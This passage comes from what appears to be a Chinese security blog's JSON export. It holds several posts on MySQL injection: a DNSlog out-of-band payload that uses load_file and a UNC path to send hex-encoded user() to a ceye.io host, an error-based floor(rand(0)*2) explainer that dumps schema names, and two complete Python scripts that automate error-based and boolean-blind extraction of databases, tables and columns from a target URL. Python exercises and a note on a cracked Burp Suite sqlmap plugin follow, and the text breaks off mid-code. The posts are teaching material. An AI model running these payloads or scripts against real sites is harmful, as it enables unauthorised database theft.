user()查询到的是root@localhost这样在url里面就变成了http://root@localhost.xxxxx.ceye.io/，显然这样的url不是我们想要的，因为里面有特殊字符@，这样访问的时候就会将root当成用户名，来访问localhost.xxxxx.ceye.io/站点,这点不懂的需要去了解一下URL的组成。正如下图所示： 那么现在明白为什么查询user()查询不到了吧，而我现在找到的解决办法是将查询的结果通过base64编码输出出来，但是这个需要mysql版本大于5.6.1才能使用to_base64()编码函数，而我现在的数据库版本是5.5.53，无奈再次就不再演示了，顺便在说下base64解码函数from_base64() 至于mysql版本小于5.6.1就没办法了吗？我现在能想到的就是先查询字符串结果的长度，然后通过一个一个拆分，将其ascii编码，然后查询到我们在解码，最后拼接得到结果。虽然麻烦，还好一般字符串不会太长。以后有时间有更好的方法再分享吧。 好了，今天的奇淫技巧就到这，大家没事也可以尝试尝试，总结总结，不过友情提示：今天这个奇淫技巧对与window服务器是没问题的，但是Linux服务器貌似不行，至于是什么原因，好像是由于unc的缘故，大家可以去Google或者百度一下unc,笔者有时间也会再去深入研究其原因和其局限性，到时候再更新补充吧。 step4 后续 之前说使用dnslog查询的有的内容是不能带入URL的，后来也没想到办法，但是后来有想到可以将查询到的内容进行hex()十六进制编码再带进URL里面访问，这样我们就能在dnslog里面看到我们查询到的信息了，不过看到的是十六进制编码内容，我们在将其解码即可。 下面一个简单的例子学习以下这个姿势 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(user())),&#39;.k3i80p.ceye.io\\\\abc&#39;))),1,1)--+ 将查询数据hex()解密一下看看，nice，没错是root@locakhost","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"mysql报错注入原理分析之floor()","slug":"web安全/mysql报错注入原理分析之floor","date":"2018-06-06T01:00:00.000Z","updated":"2018-11-26T06:46:24.000Z","comments":true,"path":"2018/06/06/web安全/mysql报错注入原理分析之floor/","link":"","permalink":"http://zzqsmile.top/2018/06/06/web%E5%AE%89%E5%85%A8/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/","excerpt":"环境：mysql 5.1.73 123[root@localhost ~]# mysql --versionmysql Ver 14.14 Distrib 5.1.73, for redhat-linux-gnu (x86_64) using readline 5.1[root@localhost ~]#","text":"环境：mysql 5.1.73 123[root@localhost ~]# mysql --versionmysql Ver 14.14 Distrib 5.1.73, for redhat-linux-gnu (x86_64) using readline 5.1[root@localhost ~]# 1.首先普及几个mysql里面的函数 floor() 在mysql里面floor()函数是取整**(注意：不是四舍五入)**，下面实际操作验证一下 123456789101112131415161718192021222324mysql&gt; select floor(0.3);+------------+| floor(0.3) |+------------+| 0 |+------------+1 row in set (0.00 sec)mysql&gt; select floor(0.5);+------------+| floor(0.5) |+------------+| 0 |+------------+1 row in set (0.00 sec)mysql&gt; select floor(0.8);+------------+| floor(0.8) |+------------+| 0 |+------------+1 row in set (0.00 sec) 1234567891011121314151617181920212223242526mysql&gt; select floor(1.8);+------------+| floor(1.8) |+------------+| 1 |+------------+1 row in set (0.00 sec)mysql&gt; select floor(1.5);+------------+| floor(1.5) |+------------+| 1 |+------------+1 row in set (0.00 sec)mysql&gt; select floor(1.3);+------------+| floor(1.3) |+------------+| 1 |+------------+1 row in set (0.00 sec)mysql&gt; 事实证明上面说的没毛病 group by group by 我的理解是分组查询，根据一个列或者多个列，值相等的在一起 下面实际操作理解一下，首先在数据库test里面创建一张test表 123456789mysql&gt; CREATE TABLE IF NOT EXISTS &#96;test&#96;( -&gt; &#96;id&#96; INT AUTO_INCREMENT PRIMARY KEY, -&gt; &#96;name&#96; VARCHAR(100) NOT NULL, -&gt; &#96;number&#96; INT NOT NULL, -&gt; &#96;content&#96; VARCHAR(100) -&gt; )ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;Query OK, 0 rows affected (0.07 sec)mysql&gt; 然后在test表中插入一些数据 12345678910111213141516mysql&gt; insert into test -&gt; (name,number,content) -&gt; values -&gt; (&#39;aa&#39;,2,&#39;11&#39;), -&gt; (&#39;aa&#39;,3,&#39;22&#39;), -&gt; (&#39;bb&#39;,4,&#39;33&#39;), -&gt; (&#39;bb&#39;,5,&#39;44&#39;), -&gt; (&#39;bb&#39;,5,&#39;55&#39;), -&gt; (&#39;cc&#39;,6,&#39;66&#39;), -&gt; (&#39;cc&#39;,6,&#39;77&#39;), -&gt; (&#39;dd&#39;,2,&#39;88&#39;), -&gt; (&#39;ee&#39;,2,&#39;99&#39;);Query OK, 9 rows affected (0.00 sec)Records: 9 Duplicates: 0 Warnings: 0mysql&gt; 1mysql&gt; select * from test; 接下来进行我们的探索 1mysql&gt; select * from test group by name; 通过比较，可以看出通过group by将字段name相同的进行分组查询，注意这个地方不要看其他内容，单纯理解一下这个分组的意思 然后我们接着来看，上面不是说了分组的含义吗？其实数据库在执行group by时候创建了一张虚拟的表，是知道name这个字段相同的有几条结果的，如下图测试说明： rand() 在mysql里面rand()函数是随机产生一个范围(0,1)的随机数** 那么有人也许有疑问，随机产生的值有规律吗？为了验证猜想，下面找一个数据量比较大的表information_schema.tables测试一下，这里我只取30条数据实验 1mysql&gt; select rand() from information_schema.tables limit 0,30; 首先可以查看到每一条都是随机产生的浮点型值，而且这条sql语句经过多次执行发现，每一次执行结果也是随机的，由此可以得出此时rand()是真随机. 这样看起来是不是有点累，开始的时候我首先普及了一个floor()取整函数，那么接下来我们可以这样做，会更清晰，更直观. 1mysql&gt; select floor(rand()) from information_schema.tables limit 0,30; 这样看是不是就这清晰直观明了，但是有人又有疑问了吧，为什么都是0呢，不是随机的吗，别忘了我们rand()随机范围(0,1)，也就是随机出来的都是小于1的小数，然后floor()取整后可不都是0吗，这样看着方便了，但是却看不到随机性了，那好我们想个办法继续往下看。 12mysql&gt; select floor(rand()*2) from information_schema.tables limit 0,30; 这步看着应该不难理解吧，就是将随机范围(0,1)扩大2倍变成(0,2),这样随机值是不是有0点多的、1点多的,然后取整就可以清晰简单的研究其规律。经过多次执行这条语句发现：是没有规律的。这和之前没取整说的真随机是一样的。 既然rand()是没有规律的，我们怎么研究？报错注入我们谷歌百度发现都是rand(0)，那好，我们在试一试有随机因子是什么情况 1mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0,30; 经过多次执行这条语句，你会发现这是一个规律，每次随机结果和这个一模一样 2.有了上面讲的基础知识，我们接下来就真正的研究下报错注入 首先看一条报错的sql语句 1mysql&gt; select count(*) from test.test group by floor(rand(0)*2); 可以看到报错显示位&#39;1&#39;，这个错误就是由于主键不能重复而暴出的错误 接下来一步一步分析一下这个过程(1).首先查询之前会默认建立一张空的虚拟表，如下图所示： (2).取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图: (3).查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下: (4).查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 (5).整个查询过程floor(rand(0)*2)被计算了5次，这也是开始说让记住前5个值（01101）的原因，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 注意：再次强调，此手法满足条件，需要数据表里面数据为3条以上才可以！ 3.利用mysql报错手法 首先收集基本收据库信息1234567mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,user());ERROR 1062 (23000): Duplicate entry &#39;1~root@localhost&#39; for key &#39;group_key&#39;mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,version());ERROR 1062 (23000): Duplicate entry &#39;1~5.1.73-log&#39; for key &#39;group_key&#39;mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,database());ERROR 1062 (23000): Duplicate entry &#39;1~test&#39; for key &#39;group_key&#39;mysql&gt; 然后试试暴库 123456789mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,(select schema_name from information_schema.schemata limit 0,1));ERROR 1062 (23000): Duplicate entry &#39;1~information_schema&#39; for key &#39;group_key&#39;mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,(select schema_name from information_schema.schemata limit 1,1));ERROR 1062 (23000): Duplicate entry &#39;1~aaa&#39; for key &#39;group_key&#39;mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,(select schema_name from information_schema.schemata limit 2,1));ERROR 1062 (23000): Duplicate entry &#39;1~bbb&#39; for key &#39;group_key&#39;mysql&gt; select count(*) from test.test group by concat((floor(rand(0)*2)),&quot;~&quot;,(select schema_name from information_schema.schemata limit 3,1));ERROR 1062 (23000): Duplicate entry &#39;1~challenges&#39; for key &#39;group_key&#39;mysql&gt; ok没毛病，就是这样利用的往下就不再多说。","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"文件上传解析漏洞总结","slug":"web安全/解析漏洞总结","date":"2018-06-06T01:00:00.000Z","updated":"2020-08-23T12:42:24.201Z","comments":true,"path":"2018/06/06/web安全/解析漏洞总结/","link":"","permalink":"http://zzqsmile.top/2018/06/06/web%E5%AE%89%E5%85%A8/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"关于解析漏洞的总结","text":"关于解析漏洞的总结 传送门 我的WafBypass之道(upload篇)","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件上传解析漏洞","slug":"文件上传解析漏洞","permalink":"http://zzqsmile.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"}]},{"title":"python脚本实现半自动化报错注入","slug":"python3/2018-06-05-报错","date":"2018-06-05T01:00:00.000Z","updated":"2019-09-25T09:41:38.000Z","comments":true,"path":"2018/06/05/python3/2018-06-05-报错/","link":"","permalink":"http://zzqsmile.top/2018/06/05/python3/2018-06-05-%E6%8A%A5%E9%94%99/","excerpt":"贴一个python写的报错注入脚本，就当保存一下代码，以后可以回头参考参考。 运行环境：python3","text":"贴一个python写的报错注入脚本，就当保存一下代码，以后可以回头参考参考。 运行环境：python3 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!&#x2F;usr&#x2F;bin&#x2F;env python3# -*- coding: utf-8 -*-from optparse import OptionParserimport sysimport requestsimport reparser&#x3D;OptionParser()parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action&#x3D;&quot;store&quot;,type&#x3D;&quot;string&quot;,dest&#x3D;&quot;database&quot;,help&#x3D;&quot;Please input test databases&quot;)parser.add_option(&quot;-T&quot;, &quot;--table&quot;,action&#x3D;&quot;store&quot;,type&#x3D;&quot;string&quot;,dest&#x3D;&quot;table&quot;,help&#x3D;&quot;Please input test table&quot;)parser.add_option(&quot;-C&quot;, &quot;--column&quot;,action&#x3D;&quot;store&quot;,type&#x3D;&quot;string&quot;,dest&#x3D;&quot;column&quot;,help&#x3D;&quot;Please input test column&quot;)parser.add_option(&quot;-U&quot;,&quot;--url&quot;, action&#x3D;&quot;store&quot;,type&#x3D;&quot;string&quot;,dest&#x3D;&quot;url&quot;,help&#x3D;&quot;Please input test url&quot;)(options,args) &#x3D; parser.parse_args()def main(): if options.url &#x3D;&#x3D; None and options.database &#x3D;&#x3D; None and options.table &#x3D;&#x3D; None and options.column &#x3D;&#x3D; None: print(&quot;Please read the help&quot;) parser.print_help() sys.exit() elif options.url !&#x3D; None and options.database &#x3D;&#x3D;None and options.table &#x3D;&#x3D; None and options.column &#x3D;&#x3D; None: get_all_databases(options.url) elif options.url !&#x3D; None and options.database !&#x3D;None and options.table &#x3D;&#x3D; None and options.column &#x3D;&#x3D; None: get_db_all_tables(options.url,options.database) elif options.url !&#x3D; None and options.database !&#x3D;None and options.table !&#x3D; None and options.column &#x3D;&#x3D; None: get_db_tb_all_columns(options.url,options.database,options.table) elif options.url !&#x3D; None and options.database !&#x3D;None and options.table !&#x3D; None and options.column !&#x3D; None: getAllContent(options.url,options.database,options.table,options.column)def http_get(url): result &#x3D; requests.get(url) return result.textdef get_all_databases(url): db_nums_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select count(schema_name) from information_schema.schemata),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; # print(db_nums_payload) html &#x3D; http_get(db_nums_payload) # print(html) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) # print(result) db_nums &#x3D; int(result.group(1)) print(&quot;数据库的个数为：%d&quot; % db_nums) for x in range(db_nums): db_name_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit %d,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; % x html &#x3D; http_get(db_name_payload) # print(html) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) db_name &#x3D; result.group(1) print(&quot;第%d个数据库为：%s&quot; % (x+1,db_name))def get_db_all_tables(url,database): tb_nums_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select count(table_name) from information_schema.tables where table_schema &#x3D; &#39;%s&#39;),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; % database # print(tb_nums_payload) html &#x3D; http_get(tb_nums_payload) # print(html) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) tb_nums &#x3D; int(result.group(1)) print(database,&quot;数据库中表的个数为：%d&quot; % tb_nums) for x in range(tb_nums): tb_name_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &#39;%s&#39; limit %d,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; % (database,x) # print(tb_name_payload) html &#x3D; http_get(tb_name_payload) # print(html) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) tb_name &#x3D; result.group(1) print(database,&quot;数据库第%d个数据库为：%s&quot; % (x+1,tb_name))def get_db_tb_all_columns(url,database,table): co_nums_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select count(column_name) from information_schema.columns where table_schema &#x3D; &#39;%s&#39; and table_name &#x3D; &#39;%s&#39;),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; % (database,table) html &#x3D; http_get(co_nums_payload) #print(html) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) co_nums &#x3D; int(result.group(1)) # print(co_nums) print(&quot;%s数据库中的%s表里面的字段个数为：%d&quot; % (database,table,co_nums)) for x in range(co_nums): co_name_payload &#x3D; url + &quot; and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &#39;%s&#39; and table_name &#x3D; &#39;%s&#39; limit %d,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)&quot; % (database,table,x) html &#x3D; http_get(co_name_payload) result &#x3D; re.search(r&#39;~(.*?)~&#39;,html,re.S|re.I) co_name &#x3D; result.group(1) print(&quot;%s数据库中%s表中的第%d个字段为：%s&quot; % (database,table,x+1,co_name))if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 运行结果：","categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"burpsuite使用教程","slug":"工具使用/burpsuite实战指南","date":"2018-06-05T01:00:00.000Z","updated":"2019-03-18T02:18:32.000Z","comments":true,"path":"2018/06/05/工具使用/burpsuite实战指南/","link":"","permalink":"http://zzqsmile.top/2018/06/05/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/burpsuite%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/","excerpt":"burpsuite使用教程传送门","text":"burpsuite使用教程传送门 burp实战指南： https://t0data.gitbooks.io/burpsuite/","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"burpsuite","slug":"burpsuite","permalink":"http://zzqsmile.top/tags/burpsuite/"}]},{"title":"python脚本实现半自动化布尔盲注","slug":"python3/2018-06-04-布尔盲注","date":"2018-06-04T01:00:00.000Z","updated":"2018-11-26T06:42:52.000Z","comments":true,"path":"2018/06/04/python3/2018-06-04-布尔盲注/","link":"","permalink":"http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","excerpt":"贴一个python写的布尔盲注脚本，就当保存代码了，以后可以回头参考参考。 运行环境：python3","text":"贴一个python写的布尔盲注脚本，就当保存代码了，以后可以回头参考参考。 运行环境：python3 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#!/usr/bin/env python3# -*- coding: utf-8 -*-from optparse import OptionParserimport sysimport requestsimport hashlibparser=OptionParser()parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;database&quot;,help=&quot;Please input test databases&quot;)parser.add_option(&quot;-T&quot;, &quot;--table&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;Please input test table&quot;)parser.add_option(&quot;-C&quot;, &quot;--column&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;Please input test column&quot;)parser.add_option(&quot;-U&quot;,&quot;--url&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;Please input test url&quot;)(options,args) = parser.parse_args()def main(): if options.url == None and options.database == None and options.table == None and options.column == None: print(&quot;Please read the help&quot;) parser.print_help() sys.exit() elif options.url != None and options.database ==None and options.table == None and options.column == None: get_all_databases(options.url) elif options.url != None and options.database !=None and options.table == None and options.column == None: get_db_all_tables(options.url,options.database) elif options.url != None and options.database !=None and options.table != None and options.column == None: get_db_tb_all_columns(options.url,options.database,options.table) elif options.url != None and options.database !=None and options.table != None and options.column != None: getAllContent(options.url,options.database,options.table,options.column)def http_get(url): result = requests.get(url) return result.content#获取数据库def get_all_databases(url): db_nums_payload = &quot;select count(schema_name) from information_schema.schemata&quot; db_numbers = half(url,db_nums_payload) print(&quot;数据库的总个数为：%d&quot; % db_numbers) for x in range(db_numbers): db_len_payload = &quot;select length(schema_name) from information_schema.schemata limit %d,1&quot; % x db_name_numbers = half(url,db_len_payload) db_name = &quot;&quot; for y in range(1,db_name_numbers+1): db_name_payload = &quot;ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))&quot; % (x,y) db_name += chr(half(url,db_name_payload)) print(&quot;第%d个数据库为：%s&quot; % (x+1,db_name))#获取指定数据库中的表def get_db_all_tables(url,database): tb_nums_payload = &quot;select count(table_name) from information_schema.tables where table_schema = &#x27;%s&#x27;&quot; % database tb_numbers = half(url,tb_nums_payload) print(&quot;%s数据库中的表个数为：%d&quot; % (database,tb_numbers)) for x in range(tb_numbers): tb_len_payload = &quot;select length(table_name) from information_schema.tables where table_schema = &#x27;%s&#x27; limit %d,1&quot; % (database,x) tb_name_numbers = half(url,tb_len_payload) # print(tb_name_numbers) tb_name = &quot;&quot; for y in range(1,tb_name_numbers+1): tb_name_payload = &quot;ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;%s&#x27; limit %d,1),%d,1))&quot; % (database,x,y) # print(tb_name_payload) tb_name += chr(half(url,tb_name_payload)) # print(tb_name) print(database,&quot;数据库中第%d个表为：%s&quot; % (x+1,tb_name))#获取指定数据库中指定表的字段 def get_db_tb_all_columns(url,database,table): co_nums_payload = &quot;select count(column_name) from information_schema.columns where table_schema = &#x27;%s&#x27; and table_name = &#x27;%s&#x27;&quot; % (database,table) co_numbers = half(url,co_nums_payload) print(&quot;%s 数据库中的 %s 表中的字段个数为：%d&quot; % (database,table,co_numbers)) for x in range(co_numbers): co_len_payload = &quot;select length(column_name) from information_schema.columns where table_schema = &#x27;%s&#x27; and table_name = &#x27;%s&#x27; limit %d,1&quot; % (database,table,x) co_name_numbers = half(url,co_len_payload) co_name = &quot;&quot; for y in range(1,co_name_numbers+1): co_name_payload = &quot;ascii(substr((select column_name from information_schema.columns where table_schema = &#x27;%s&#x27; and table_name = &#x27;%s&#x27; limit %d,1),%d,1))&quot; % (database,table,x,y) co_name += chr(half(url,co_name_payload)) print(database,&quot;数据库中&quot;,table,&quot;表中第%d个字段名为：%s&quot; % (x+1,co_name))#获取指定数据库中指定表中指定字段内容def getAllContent(): pass#python里面没有MD5加密函数，需要自己写def md5(str): hl = hashlib.md5() hl.update(str) return hl.hexdigest()#二分法函数def half(url,payload): low = 0 high = 126 standard_html = md5(http_get(url)) # print(standard_html) while low &lt;= high: mid=(low + high)/2 mid_num_payload = url + &quot; and (%s) &gt; %d-- &quot; % (payload,mid) # print(mid_num_payload) mid_html = md5(http_get(mid_num_payload)) #print(mid_html) if mid_html == standard_html: low = mid + 1 else: high = mid - 1 mid_num = int((low+high+1)/2) return mid_numif __name__ == &#x27;__main__&#x27;: main() 运行结果：","categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"burpsuite安装sqlmap模块---神器合一","slug":"工具使用/2018-06-04-burp安装sqlmap模块","date":"2018-06-04T01:00:00.000Z","updated":"2019-08-06T07:00:00.000Z","comments":true,"path":"2018/06/04/工具使用/2018-06-04-burp安装sqlmap模块/","link":"","permalink":"http://zzqsmile.top/2018/06/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2018-06-04-burp%E5%AE%89%E8%A3%85sqlmap%E6%A8%A1%E5%9D%97/","excerpt":"今天有点时间，赶紧记录一个坑！哈哈…","text":"今天有点时间，赶紧记录一个坑！哈哈… 都知道burpsuite是web渗透神器，里面不仅模块功能集成好用，而且可以自定义安装扩展模块,当然牛人也可以自己写一个模块与其对接，这个对于我来说来说目前是望尘莫及 今天要记录的是burp扩展安装sqlmapapi，废话不多说，开始教程 step1.查看sqlmap模块安装所需环境 可以看到需要java python 以及 Jython，java和python环境我都装过了，坑位也不在这，java装JRE，python装python2版本 step2.下载Jython 请注意：坑位出现！这里两个安装包区别在于第一个jython包下载下来是需要双击安装的，第二个是不需要安装，直接嵌入在java应用中的，别忘了burp可以是java开发的，因此这里应该选择第二个即上图标记之处。我开始选择第一个然后安装之后一直报错，死活不行，就安装这个安装了一天，最后我尝试各种方法，才发现坑位在这，于是我和几个和我一样的小伙伴最终成功安装。当然也有下载第一个包jython安装成功的，这个我就不知道所以然了，如果用第二个安装失败的可以尝试一下第一个。 step3.打开burpsuite，当然这里肯定是破解版，选择扩展模块Extend -&gt; 选项Option step4.选择我们存放jython的位置，请注意最好路径不要含中文 请注意这里也有一个坑位，因为之前尝试各种办法，所以安装后每次打开都是之前的路径，导致每次打开都需要重新安装sqlmap，这里选择之前请点击restore default恢复默认值，如下图所示： step5.安装sqlmap模块 这时候等待时间有点长,安装成功之后将自动出现SQLiPY模块 step6.开启使用SQLiPY 这个时候就可以将拦截到的带有参数的包右击发送到这个模块 点击开始扫描 OK就先写这么多吧！","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"burpsuite","slug":"burpsuite","permalink":"http://zzqsmile.top/tags/burpsuite/"}]},{"title":"python二分法小程序原理研究","slug":"python3/2018-06-03-python-二分法原理","date":"2018-06-03T01:00:00.000Z","updated":"2018-06-08T04:08:38.000Z","comments":true,"path":"2018/06/03/python3/2018-06-03-python-二分法原理/","link":"","permalink":"http://zzqsmile.top/2018/06/03/python3/2018-06-03-python-%E4%BA%8C%E5%88%86%E6%B3%95%E5%8E%9F%E7%90%86/","excerpt":"用python写sql注入脚本时候，二分法是必须用到的知识，所以为了理解里面的弯弯绕，首先写了一个简单二分法模型以供后续研究理解","text":"用python写sql注入脚本时候，二分法是必须用到的知识，所以为了理解里面的弯弯绕，首先写了一个简单二分法模型以供后续研究理解 写的这个程序就是输入一个0-126范围的数字，通过二分法能找到你输入的是多少 代码： 123456789101112131415161718192021222324252627282930# -*- coding=utf-8 -*-#二分法判断函数 Dichotomy(二分法)def Dichotomy(num): low = 0 high = 126 # print(&quot;--------&quot;) while low &lt;= high: mid = (low + high)/2 # print(&quot;本次循环中间值&quot;,mid) if num &gt; mid: low = mid + 1 # print(&quot;low&quot;,low) else: high = mid - 1 # print(high) # print(&quot;-------区间范围：(&quot;,low,&quot;-&quot;,high,&quot;)\\n&quot;) mid_num = int((low + high + 1)/2) #范围在0-126之间的都会返回整数浮点型值，比如8.0，为了方便转化为整形 # print(int(mid_num)) return mid_num input_num = int(input(&quot;请输入整形数值(0~126):&quot;))rt_is_num = Dichotomy(input_num)print(rt_is_num) 代码里面的注释代码是可以取消注释以供理解程序每一次循环效果的，有助于理解，此代码仅供记录学习，过程不详细讲了，看不懂的好好理解下，勿喷！","categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"}],"tags":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/tags/python3/"}]},{"title":"python练习小程序","slug":"python3/2018-06-03-python练习程序","date":"2018-06-02T01:00:00.000Z","updated":"2019-09-13T12:24:30.000Z","comments":true,"path":"2018/06/02/python3/2018-06-03-python练习程序/","link":"","permalink":"http://zzqsmile.top/2018/06/02/python3/2018-06-03-python%E7%BB%83%E4%B9%A0%E7%A8%8B%E5%BA%8F/","excerpt":"案例1 题目：编写程序，生成包含1000个0到100之间的随机整数，并统计每个元素的出现次数（提示：使用集合）。","text":"案例1 题目：编写程序，生成包含1000个0到100之间的随机整数，并统计每个元素的出现次数（提示：使用集合）。 代码： 1234567891011121314151617#导入随机模块import random #首先先生成一个随机0到100之间的随机整数，然后循环1000次，得到一个长度1000的列表x, 注意列表里面的元素是可以重复出现的x=[random.randint(0,100) for i in range(1000)] #可以输出一下列表x看看print(x)#然后将列表x转化为集合d, 注意集合里面元素是不能重复的d=set(x)#可以输出元组看看print(d)#接下来循环遍历元组d里面的每一个元素 在 列表x中出现的次数for v in d: print(v,&#x27;:&#x27;,x.count(v)) 运行结果比较长，自行测试 案例2 题目：设计一个字典，并编写程序，用户输入内容作为键，然后输出字典中对应的值，如果用户输入的键不存在，则输出“您输入的键不存在！”。 代码： 12345678910# -*- coding: utf-8 -*- dict11 = &#123;&#x27;one&#x27;:&#x27;zhangsan&#x27;,&#x27;two&#x27;:&#x27;lisi&#x27;,&#x27;three&#x27;:3&#125;user_input = input(&quot;请输入字典键值：&quot;)if user_input in dict11.keys():print(dict11[user_input])else: print(&quot;您输入的键值不存在&quot;) 运行结果： 案例3 题目：编写程序，生成包含20个随机数的列表，然后将前10个元素升序排列，后10个元素降序排列，并输出结果。 代码： 123456789101112131415161718# -*- coding: utf-8 -*- import randomlist1 = [random.randint(0,100) for i in range(20)]print(&quot;列表生成结果：\\n&quot;,list1)a = list1[0:10]a.sort()print(&quot;列表list前10个元素升序排列结果：\\n&quot;,a)b = list1[10:20]b.sort(reverse = True)print(&quot;列表list后10个元素降序排列结果：\\n&quot;,b)a.extend(b)print(&quot;前10个元素升序排列和后10个元素降序排列合并之后列表为：\\n&quot;,a) 运行结果： 案例4 题目：编写程序，生成一个包含20个随机整数的列表，然后对其中偶数下标的元素进行降序排列，奇数下标的元素不变。（提示：使用切片。） 代码： 1234567891011121314# -*- coding: utf-8 -*- import randomlist1 = [random.randint(0,100) for i in range(20)]print(&quot;随机生成的列表list：\\n&quot;,list1)y = list1[::2]y.sort(reverse = True)print(&quot;list列表偶数下标降序排列结果：\\n&quot;,y)list1[::2] = yprint(&quot;最终对list列表偶数下标降序排列而奇数下标元素不变的结果：\\n&quot;,list1) 运行结果： 案例5 题目：编写程序，至少使用2种不同的方法计算100以内所有奇数的和 代码： 123456789101112131415161718192021222324#方法1# -*- coding: utf-8 -*- import randomsum1 = 0for i in range(1,101,2): sum1 += iprint(&quot;方法1：100以内奇数之和:&quot;,sum1)#方法2sum2 = 0i = 1while i &lt; 100: if i%2 != 0: sum2 += i i += 1print(&quot;方法2：100以内奇数之和：&quot;,sum2) 运行结果： 案例6 题目：编写函数，判断一个整数是否为素数，并编写主程序调用该函数 代码： 1234567891011121314# -*- coding: utf-8 -*-num = int(input(&quot;请输入一个正整数：&quot;))def issushu(n): for i in range(2,n): if n%i == 0: print(n,&quot;不是一个素数&quot;) break else: 